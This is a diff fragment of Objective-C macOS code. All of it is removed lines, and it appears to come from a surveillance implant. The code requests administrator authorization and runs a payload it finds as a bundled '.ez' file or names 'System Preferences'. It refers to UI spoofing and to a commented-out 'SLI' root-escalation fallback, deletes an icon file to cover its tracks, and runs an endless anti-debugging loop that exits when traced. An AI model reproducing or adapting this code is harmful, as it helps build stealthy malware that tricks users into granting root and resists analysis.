-  // Create an empty auth ref to fill later
-  //
-  myStatus = AuthorizationCreate(&myRights,
-                                 //kAuthorizationEmptyEnvironment,
-                                 &authEnvironment,
-                                 myFlags,
-                                 &myAuthorizationRef);
-  
-  //
-  // errAuthorizationSuccess returned in case of success
-  //
-  if (myStatus != errAuthorizationSuccess)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error while creating the empty Authorization Reference");
-#endif
-      //return myStatus;
-    }
-  /*
-  myStatus = AuthorizationCopyRights(myAuthorizationRef,
-                                     &myRights,
-                                     //kAuthorizationEmptyEnvironment,
-                                     &authEnvironment,
-                                     myFlags,
-                                     NULL);
-  
-  if (myStatus != errAuthorizationSuccess)
-    {
-#ifdef DEBUG_UI_SPOOF
-      errorLog(@"[EE] Error while authorizing the user");
-#endif
-      
-      [self _createInternalFilesAndFolders];
-      
-      //
-      // Only perform SLI escalation on 10.5 since it doesn't seem to work
-      // on 10.6
-      //
-      if (gOSMajor == 10 && gOSMinor == 5)
-        {
-          if ([self getRootThroughSLI] == YES)
-            {
-#ifdef DEBUG_CORE
-              warnLog(@"Err on auth, switching to SLI PLIST mode");
-#endif
-              [gUtil dropExecFlag];
-            }
-        }
-  
-      [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
-                                                 error: nil];
-      
-      exit(-1);
-    }*/
-  /*  
-  //
-  // Turn an AuthorizationRef into an external "byte blob" form so it can be
-  // passed over the authenticated execution
-  //
-  myStatus = AuthorizationMakeExternalForm(myAuthorizationRef, &extAuth);
-  if (myStatus != errAuthorizationSuccess)
-    {
-#ifdef DEBUG_UI_SPOOF
-      errorLog(@"Unable to turn the AuthorizationRef into external form");
-#endif
-    }*/
-  
-  if (execPath == nil)
-    {
-      if ([gUtil isLeopard])
-        {
-          NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
-                                     [[NSBundle mainBundle] bundlePath]];
-          
-          NSArray *_searchedFile = searchForProtoUpload(searchPattern);
-          [searchPattern release];
-          
-          [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
-                                                     error: nil];
-          
-          if ([_searchedFile count] > 0)
-            {
-              execPath = [[_searchedFile objectAtIndex: 0]
-                          stringByReplacingOccurrencesOfString: @".ez"
-                          withString: @""];
-            }
-          else
-            {
-#ifdef DEBUG_CORE
-              errorLog(@"ez file not found");
-#endif
-              exit(-1);
-            }
-        }
-      else
-        {
-          execPath = [NSString stringWithFormat: @"%@",
-                      [[[NSBundle mainBundle] bundlePath]
-                       stringByAppendingPathComponent: @"System Preferences"]];
-        }
-    }
-  
-#ifdef DEBUG_CORE
-  infoLog(@"Executing with auth (%@)", execPath);
-#endif
-  
-  myStatus = AuthorizationExecuteWithPrivileges(myAuthorizationRef,
-                                                (char *)[execPath UTF8String],
-                                                kAuthorizationFlagDefaults,
-                                                nil,
-                                                &myCommunicationsPipe);
-  
-  if (myStatus != errAuthorizationSuccess)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error on last step");
-#endif
-    }
-  else
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"Auth executed with success (%s)", myReadBuffer);
-#endif
-      read(fileno(myCommunicationsPipe), myReadBuffer, sizeof(myReadBuffer));
-      fclose(myCommunicationsPipe);
-    }
-  
-  [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
-                                             error: nil];
-  
-  //
-  // Free the AuthorizationRef
-  //
-  AuthorizationFree(myAuthorizationRef, kAuthorizationFlagDestroyRights);
-  
-#ifdef DEBUG_CORE
-  warnLog(@"Quitting from auth");
-#endif
-
-  exit(0);
-}
-
-//
-// See http://developer.apple.com/qa/qa2004/qa1361.html
-//
-- (void)xfrth
-{
-  while (true)
-    {
-      int                 junk;
-      int                 mib[4];
-      struct kinfo_proc   info;
-      size_t              size;
-      
-      //
-      // Initialize the flags so that, if sysctl fails for some bizarre
-      // reason, we get a predictable result.
-      //
-      info.kp_proc.p_flag = 0;
-      
-      //
-      // Initialize mib, which tells sysctl the info we want, in this case
-      // we're looking for information about a specific process ID. 
-      //
-      mib[0] = CTL_KERN;
-      mib[1] = KERN_PROC;
-      mib[2] = KERN_PROC_PID;
-      mib[3] = getpid();
-      
-      // Call sysctl
-      size = sizeof(info);
-      junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
-      
-      // We're being debugged if the P_TRACED flag is set
-      if ((info.kp_proc.p_flag & P_TRACED) != 0)
-        {
-          exit(-1);
-        }
-      
-      usleep(50000);
-    }
-}
 
 @end
